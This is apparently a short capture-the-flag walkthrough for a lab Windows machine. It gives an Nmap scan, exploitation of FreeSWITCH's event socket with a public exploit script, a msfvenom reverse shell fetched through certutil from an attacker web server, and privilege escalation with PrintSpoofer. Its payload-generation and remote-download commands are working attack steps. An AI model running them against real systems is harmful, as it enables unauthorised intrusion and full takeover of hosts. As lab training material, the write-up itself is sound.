ip address: 10.10.129.100

Nmap: 

PORT     STATE SERVICE            REASON  VERSION
3389/tcp open  ssl/ms-wbt-server? syn-ack
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-03-24T10:14:17+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Issuer: commonName=WIN-EOM4PK0578N
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T16:47:35
| Not valid after:  2022-05-10T16:47:35
| MD5:   6190 7ede 74c9 0701 1160 e36b 2f39 b580
| SHA-1: f3b6 a09c 7ee5 1abd cdbb 03f5 2c63 3e19 6974 659b
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQXDeP1CLg17JO48/W76i0KzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wHhcNMjExMTA4MTY0NzM1WhcNMjIw
| NTEwMTY0NzM1WjAaMRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDL7cn7UF+DQHuhTJbAfhqR8XMjvt2maC/u
| /q2ZuuoCesWamyIIO1Zh0avn0b/PblDllmdJYlXSoTMA/Vp3Ivv2iRqWHmayboXJ
| WoCdwZVIPR2lUsdAqLumWJqpwFTEsLAPnPPf8+qkrDZcU9ODBS7Ylaytp4Bi37b7
| fGhxEzz4lMRnjXFQhvOlkKSbnyLR40hc9BBLoRB7xrMSSe7tNzqT8MJRX2PGsSyS
| 0FKXnb9845OdYxyj9bey5bje24Tn3v/jDsVQF3Eg1YBZ41559QFPADAqQViszdfG
| hahEdyAfFvL50Wbr0Ql8EzqXha5Fn65+EbXRI4HIyhnXE0sHLQsxAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAlTOaIMVmLC3ey7UxLnB4oFeiYO/EA4axDmgUTXbQpYHdtMPtw1Rd2cSW
| PCZv7Zo5AZuH04g5UZm1W4wLCxleYpfNSsDcSy7yZmGqkhCCHMQRagEvBtDFkcbZ
| Frc6NW2UACE+Y5j4VeiihPFl2bZk4D97O/C6n21XBYeO6BK83wDxni39QG9H+r5/
| qgVrOPcSpyH8jwwfxzuxVNMFgmlVxQWpPmw6n5nX3MdtoIv0hk+XlU7e4K/MU670
| TIzBvqi23ufeMKwr7ROhiBqj4Najbig4cmHT6vNLasFVAlS7IDlYEPQs7XxAZd+L
| ZYBTmjO8tjMZbckOdtXGjjnYHDcFhw==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-03-24T10:14:17+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event   syn-ack FreeSWITCH mod_event_socket


use searchsploit for Freeswitch and use 47799.py for exploit

create a payload and upload it to the victims machine using the eploit
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.156 LPORT=1337 -f exe > shell.exe  

47799.py IP "certutil -urlcache -split -f "http://10.9.1.6:8080/shell.exe""

after gaining acces into the machine check for priv:
whoami /priv

notice set impersoantion token is enabled
=> use PrintSpoofer.exe to impersonate print spooler

upload PrintSpoofer.exe to the machine:

certutil -url -split -f "http://10.9.1.6:8080/PrintSpoofer.exe"

run PrintSpoofer.exe to get root:

$ PrintSpoofer.exe -i -c cmd

